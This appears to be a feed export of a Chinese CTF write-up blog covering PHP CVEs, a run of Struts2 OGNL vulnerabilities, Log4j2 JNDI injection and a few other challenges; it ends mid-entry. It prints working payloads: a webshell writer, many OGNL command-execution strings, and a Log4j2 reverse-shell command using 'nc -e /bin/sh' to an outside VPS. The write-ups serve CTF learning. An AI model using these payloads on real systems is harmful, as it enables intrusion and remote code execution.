    <content type="html"><![CDATA[<h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。<br><code>ctfshow web311</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645864.png"></p><p>抓包发现</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101645192.png"><br>搜一下<br><a href="https://blog.qualys.com/product-tech/2019/10/30/php-remote-code-execution-vulnerability-cve-2019-11043">PHP Remote Code Execution Vulnerability (CVE-2019-11043)</a></p><p>具体利用：<br>工具：<a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a><br><a href="https://www.topgoer.com/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/go%E7%9A%84%E5%AE%89%E8%A3%85.html">需要安装go环境</a></p><pre><code>git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build</code></pre><p><code>go get</code>可能会<code>time out</code><br>执行如下命令：</p><pre><code>go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.io,direct# 设置不走 proxy 的私有仓库，多个用逗号相隔（可选）go env -w GOPRIVATE=*.gitlab.com</code></pre><p>然后<br><code>go run . &quot;http://5882cf97-4bf8-46e9-a282-e212fc598c19.challenge.ctf.show/index.php&quot;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101650720.png"></p><p>payload:<code>?a=cat fl*</code><br>多刷新几次就出来了</p><h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><p>PHP imap 远程命令执行漏洞（CVE-2018-19518）</p><blockquote><p><code>php imap</code>扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用<code>rsh</code>来连接远程<code>shell</code>，而<code>debian/ubuntu</code>中默认使用<code>ssh</code>来代替<code>rsh</code>的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><p><code>ctfshow web312</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101722105.png"></p><p>payload:<code>hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=123&amp;password=123</code></p><p><code>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw</code>—–&gt;<code>echo &#39;&lt;?php eval($_POST[1]);&#39; &gt; /var/www/html/1.php</code></p><p>写入马，执行命令</p><h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><p>P神的文章<br><a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）</a></p><p>影响版本：php &lt; 5.3.12 php &lt; 5.4.2</p><p>利用：<br>cgi模式下的两个参数：</p><ul><li><code>-s</code>显示文件源码</li><li><code>-d</code>指定配置项<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201101744336.png"></li></ul><p>经过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码</p><p>payload：</p><pre><code>index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//inputpost：&lt;?php echo `cat /somewhere/fla9.txt`; ?&gt;</code></pre><hr><p>还有一个写session文件的和一个xdebug的，没有复现成功<br><a href="https://blog.csdn.net/q20010619/article/details/120594729">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2019-11043&quot;&gt;&lt;a href=&quot;#CVE-2019-11043&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-11043&quot;&gt;&lt;/a&gt;CVE-2019-11043&lt;/h2&gt;&lt;p&gt;CVE-2019-11043 是一个远程代码</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    <category term="phpcve" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/phpcve/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Strut-S2-</title>
    <link href="http://lll-nnn.github.io/2022/01/08/Strut-S2-001/"/>
    <id>http://lll-nnn.github.io/2022/01/08/Strut-S2-001/</id>
    <published>2022-01-08T14:30:25.000Z</published>
    <updated>2022-01-09T08:58:52.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p><code>S2-001</code>是struts漏洞的编号</p><p>Struts2是用java语言编写的一个基于MVC设计模式的Web应用框架<br>判断是否为Strut2框架：</p><ul><li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li><li>通过网页后缀来判断，如.do .action，有可能不准。</li><li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。<br><a href="https://blog.csdn.net/qq_27446553/article/details/73639456">MORE</a></li></ul><blockquote><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p></blockquote><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p></blockquote><p>OGNL表达式中</p><ul><li><code>%</code>   的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>   的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>   主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>payload:</p><pre><code>//获取tomact路径%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;//获取web路径%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;//命令执行%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre><p>flag再env中<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201082249732.png"><br>或者直接用工具打<br><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br>检测<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action</code><br>命令执行<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action -n S2-001 --exec</code></p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p><code>S2-003</code></p><blockquote><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过<code>unicode</code>编码（u0023）或<code>8进制</code>（43）绕过了安全限制，达到代码执行的效果</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.0.11.2</p></blockquote><p><code>S2-005</code></p><blockquote><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p></blockquote><blockquote><p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p></blockquote><p>工具打</p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p><code>S2-007</code></p><blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>payload:</p><blockquote><p><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;</code></p></blockquote><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p><code>S2-008</code></p><blockquote><p>S2-008有两个洞，一个是cookie处，另一个是在开启devMode模式后的调试接口能够命令执行</p></blockquote><p>姿势2：<br>payload：</p><blockquote><p><code>devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</code></p></blockquote><p>姿势1：<br>payload：</p><blockquote><p><code>Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)=Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;env&quot;)&#39;)(1)(2)=Twings;</code></p></blockquote><p>不过没成功</p><p>工具打</p><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><code>Struts2 showcase远程代码执行漏洞</code></p><p><code>S2-009</code><br>payload:</p><blockquote><p><code>/S2-009/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></p></blockquote><p>工具打</p><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p><code>S2-012</code></p><blockquote><p>  如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p></blockquote><pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre><blockquote><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13</p></blockquote><p>payload:</p><pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p><code>S2-013</code></p><pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：    none - 链接不包含请求的任意参数值（默认）    get - 链接只包含 GET 请求中的参数和其值    all - 链接包含 GET 和 POST 所有参数和其值&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞影响版本：2.0.0 - 2.3.14.1</code></pre><p>payload:</p><blockquote><p><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p></blockquote><p>工具打</p><h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / &quot; / 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力影响版本: 2.0.0 - 2.3.14.2</code></pre><p><code>http://d3a0fd25-58fe-4c11-a18f-99824e28344a.challenge.ctf.show/S2-015/$%7B1+1%7D.action</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091545469.png"></p><p>poc</p><blockquote><p><code>$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></p></blockquote><p>url编码</p><blockquote><p><code>%24%7B%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream())%2C%23q%7D.action%0A</code></p></blockquote><h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式影响版本: 2.0.0 - 2.3.15</code></pre><p>payload:</p><blockquote><p><code>redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D</code></p></blockquote><h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p><code>S2-019</code></p><p>poc</p><pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()// 利用是先进行url编码    与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre><h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><p><code>S2-029</code></p><pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre><p>poc:<code>default.action?message=(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091614116.png"></p><h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p><code>S2-032</code></p><pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre><p>poc:<code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env</code></p><h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p><code>S2-033</code></p><pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre><p>poc:<code>/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p><code>S2-037</code></p><pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre><p>poc:<code>/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p><code>反编译</code></p><p>给了一个<code>war</code>包</p><p>用<a href="https://github.com/java-decompiler/jd-gui/releases"><code>Java decompiler</code></a></p><p>反编译</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649320.png"></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649164.png"><br>payload：<code>/ctfshow/login?username=admin&amp;password=ctfshow</code></p><hr><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web279&quot;&gt;&lt;a href=&quot;#web279&quot; class=&quot;headerlink&quot; title=&quot;web279&quot;&gt;&lt;/a&gt;web279&lt;/h2&gt;&lt;p&gt;&lt;code&gt;S2-001&lt;/code&gt;是struts漏洞的编号&lt;/p&gt;
&lt;p&gt;Struts2是用java语言</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2</title>
    <link href="http://lll-nnn.github.io/2021/12/29/Log4j2/"/>
    <id>http://lll-nnn.github.io/2021/12/29/Log4j2/</id>
    <published>2021-12-29T11:28:38.000Z</published>
    <updated>2021-12-29T11:45:14.477Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Log4j2-RCE"><a href="#Apache-Log4j2-RCE" class="headerlink" title="Apache Log4j2 RCE"></a>Apache Log4j2 RCE</h2><p>BugKu:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291933557.png"><br>先dnslog看看<br><code>$&#123;jndi:ldap://hhkzdj.dnslog.cn&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291934351.png"><br>有回显，所以存在<code>Log4j2</code></p><p>需要先在自己VPS上搭建一个JNDI服务<br><code>Github: https://github.com/welk1n/JNDI-Injection-Exploit</code><br>git clone 下来</p><pre><code>1.cd JNDI-Injection-Exploit2.mvn clean package -DskipTests     //这一步报错的话直接下载作者给的jar包也行3.java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;VPS_IP&quot;    //开启服务</code></pre><p><code>java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc xxx.xxx.xxx.xxx 9999 -e /bin/sh&quot; -A xxx.xxx.xxx.xxx</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291941336.png"><br>选择一个<code>JNDI Links</code><br>如：<code>ldap://120.76.136.64:1389/idzbzl</code><br>payload:<code>$&#123;jndi:ldap://120.76.136.64:1389/idzbzl&#125;</code><br>监听端口即可</p><p>参考：<a href="http://vfree.ltd/index.php/archives/386.html">http://vfree.ltd/index.php/archives/386.html</a><br>    <a href="https://www.cnblogs.com/ktsm/p/15695560.html">https://www.cnblogs.com/ktsm/p/15695560.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Log4j2-RCE&quot;&gt;&lt;a href=&quot;#Apache-Log4j2-RCE&quot; class=&quot;headerlink&quot; title=&quot;Apache Log4j2 RCE&quot;&gt;&lt;/a&gt;Apache Log4j2 RCE&lt;/h2&gt;&lt;p&gt;BugKu:&lt;a h</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="bugku" scheme="http://lll-nnn.github.io/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>SCTF2021</title>
    <link href="http://lll-nnn.github.io/2021/12/28/SCTF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/28/SCTF2021/</id>
    <published>2021-12-28T02:43:52.000Z</published>
    <updated>2021-12-28T02:58:52.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h2><p>签到go题</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281045198.png"><br>给了源码</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281046293.png"><br>需要从localhost访问<br><a href="https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP">https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP</a><br>这里</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281047584.png"><br>所以可以用<code>x-real-ip</code><br>然后GET传参age获取admin的password<br><code>age=&#123;&#123;$&#125;`或者`&#123;&#123;.Password&#125;&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281050227.png"></p><p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/">Write ups of TEAM-SU</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Loginme&quot;&gt;&lt;a href=&quot;#Loginme&quot; class=&quot;headerlink&quot; title=&quot;Loginme&quot;&gt;&lt;/a&gt;Loginme&lt;/h2&gt;&lt;p&gt;签到go题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="SCTF2021" scheme="http://lll-nnn.github.io/tags/SCTF2021/"/>
    
  </entry>
  
  <entry>
    <title>摆烂杯</title>
    <link href="http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    <id>http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/</id>
    <published>2021-12-27T09:50:45.000Z</published>
    <updated>2021-12-27T13:25:09.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271752482.png"></p><p>输入后会将算式式输出</p><p><code>(1)**3+(1)**3+(1)**3=3</code></p><p>不能有0</p><p>构造<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271755579.png"><br>提交得到flag</p><h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> !(!(<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>)||(!error_reporting(<span class="hljs-number">0</span>))||stripos($_GET[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-string">&#x27;.&#x27;</span>)||($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]!=<span class="hljs-number">0</span>)||(strlen($_GET[<span 